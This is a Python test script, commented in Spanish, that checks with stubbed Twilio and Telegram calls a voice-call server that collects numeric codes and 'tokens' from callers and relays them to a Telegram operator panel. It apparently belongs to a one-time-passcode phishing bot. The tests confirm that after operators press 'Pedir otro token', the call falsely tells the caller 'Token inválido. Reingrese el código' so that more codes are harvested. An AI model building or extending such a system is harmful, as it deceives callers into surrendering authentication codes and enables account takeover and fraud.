"""Prueba local de los tokens ilimitados (4.o, 5.o...) y de "Pedir otro token".

Comprueba que:
    1) al llegar al 3.o token (INTENTOS_TERCERO) aparece el boton "🔁 Pedir otro token";
    2) al pulsarlo, la llamada vuelve a pedir el código token (no reinicia el proceso);
    3) el 4.o token se escribe abajo en el MISMO panel ("Código token4: ....");
    4) el 5.o token también se apila debajo.

No usa red ni Twilio: todo simulado.

Uso:  .venv\\Scripts\\python.exe prueba_tokens_ilimitados.py
"""

import os
import sys
import types

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:  # noqa: BLE001
    pass

os.environ.setdefault("WEBHOOK_BASE_URL", "http://test.local")

import config as cfg  # noqa: E402
import servidor  # noqa: E402

# --- Aislar efectos externos: nada de red ni de base de datos ---------------
mensajes: list = []
paneles: list = []


def _fake_mensaje(texto, teclado=None):
    mensajes.append({"texto": texto, "teclado": teclado})
    return 1000 + len(mensajes)


def _fake_panel(call_sid, teclado=None):
    estado = dict(servidor.llamadas_activas.get(call_sid, {}))
    paneles.append(
        {"estado": estado, "teclado": teclado, "texto": servidor._texto_panel(estado)}
    )


servidor._tg_mensaje = _fake_mensaje
servidor._tg_panel = _fake_panel
servidor._arrancar_reloj = lambda call_sid: None
servidor._EN_HILO = False  # todo sincrono en pruebas (sin hilos)
servidor._AUTORIZAR_ACTIVO = False  # en pruebas no se comprueban admins (sin red)
servidor.bd = types.SimpleNamespace(
    nueva_llamada=lambda *a, **k: None,
    actualizar=lambda *a, **k: None,
    registrar_evento=lambda *a, **k: None,
    cerrar=lambda *a, **k: None,
)

cliente = servidor.app.test_client()
CALL_SID = "CAtestMAS00000000000000000000000001"

fallos = []


def revisar(descripcion, condicion):
    marca = "OK  " if condicion else "FALLO"
    print(f"[{marca}] {descripcion}")
    if not condicion:
        fallos.append(descripcion)


def marcar(ruta, digits=None, query=""):
    datos = {"CallSid": CALL_SID}
    if digits is not None:
        datos["Digits"] = digits
    return cliente.post(ruta + query, data=datos).get_data(as_text=True)


def botones(panel):
    return [b["callback_data"] for fila in (panel.get("teclado") or []) for b in fila]


def pulsar_boton(data):
    cliente.post(
        "/telegram/webhook",
        json={
            "callback_query": {
                "id": "cb",
                "data": f"{data}_{CALL_SID}",
                "from": {"username": "tester"},
                "message": {
                    "chat": {"id": int(cfg.TELEGRAM_GROUP_CHAT_ID)},
                    "message_id": 1,
                },
            }
        },
    )


# 1) Arrancar la llamada y llegar hasta la Fase 2 con los 3 tokens -----------
marcar("/voice/start")
marcar("/voice/recibir-primero", digits="109558")
marcar("/voice/recibir-segundo", digits="32")
servidor.llamadas_activas[CALL_SID]["estado"] = servidor.APROBADO_1_2
cliente.get(f"/voice/fase1?call_sid={CALL_SID}")
for numero in ("1111", "2222", "8443"):
    marcar("/voice/recibir-tercero", digits=numero, query=f"?call_sid={CALL_SID}")

revisar(
    "la Fase 2 trae el boton 'Pedir otro token'",
    f"pedirmas_{CALL_SID}" in botones(paneles[-1]),
)
revisar(
    "los 3 primeros tokens se ven en el panel",
    all(
        f"Código token{i}:" in paneles[-1]["texto"]
        for i in (1, 2, 3)
    ),
)

# 2) Pulsar "Pedir otro token" -> NO reinicia, vuelve a pedir el token -------
pulsar_boton("pedirmas")
revisar(
    "al pulsar 'Pedir otro token' el estado pasa a PIDIENDO_MAS",
    servidor.llamadas_activas[CALL_SID]["estado"] == servidor.PIDIENDO_MAS,
)
revisar(
    "los números NO se borraron (no reinicia el proceso)",
    servidor.llamadas_activas[CALL_SID]["primero"] == "109558",
)
salida = cliente.get(f"/voice/fase2?call_sid={CALL_SID}").get_data(as_text=True)
revisar(
    "PIDIENDO_MAS dice 'Token inválido. Reingrese el código'",
    "Token inválido" in salida and "Reingrese el código" in salida,
)
revisar(
    "PIDIENDO_MAS NO repite 'Ingrese Código token'",
    "ingrese código token" not in salida.lower(),
)
revisar(
    "PIDIENDO_MAS deja silencio ANTES del aviso (no de corrido)",
    "<Pause" in salida and salida.index("<Pause") < salida.index("Token inválido"),
)
revisar(
    "el propio aviso sirve para marcar (Gather sobre recibir-tercero)",
    "<Gather" in salida and "recibir-tercero" in salida,
)

# 3) Llega el 4.o token -> se escribe abajo, sin decir "inválido" ------------
salida4 = marcar("/voice/recibir-tercero", digits="4444", query=f"?call_sid={CALL_SID}")
revisar("el 4.o token NO se marca como inválido", "Token inválido" not in salida4)
revisar(
    "el 4.o token se escribe abajo ('Código token4: 4444')",
    "Código token4: 4444" in paneles[-1]["texto"],
)
revisar(
    "siguen viéndose los 4 tokens a la vez",
    all(f"Código token{i}:" in paneles[-1]["texto"] for i in (1, 2, 3, 4)),
)
revisar(
    "tras el 4.o token se puede seguir pidiendo otro",
    f"pedirmas_{CALL_SID}" in botones(paneles[-1]),
)

# 4) Tercer ciclo: pulsar otra vez y marcar el 5.o token ---------------------
pulsar_boton("pedirmas")
cliente.get(f"/voice/fase2?call_sid={CALL_SID}")
marcar("/voice/recibir-tercero", digits="5555", query=f"?call_sid={CALL_SID}")
revisar(
    "el 5.o token se escribe abajo ('Código token5: 5555')",
    "Código token5: 5555" in paneles[-1]["texto"],
)
revisar(
    "los 5 tokens se ven a la vez",
    all(f"Código token{i}:" in paneles[-1]["texto"] for i in (1, 2, 3, 4, 5)),
)
revisar("todo sigue en UN solo mensaje (el panel)", len(mensajes) == 1)

# 5) Validar el token sigue funcionando --------------------------------------
pulsar_boton("validar3")
revisar(
    "validar3 deja el estado en aprobado_final",
    servidor.llamadas_activas[CALL_SID]["estado"] == servidor.APROBADO_FINAL,
)

print()
if fallos:
    print(f"RESULTADO: {len(fallos)} comprobacion(es) fallaron.")
    raise SystemExit(1)
print("RESULTADO: todas las comprobaciones pasaron.")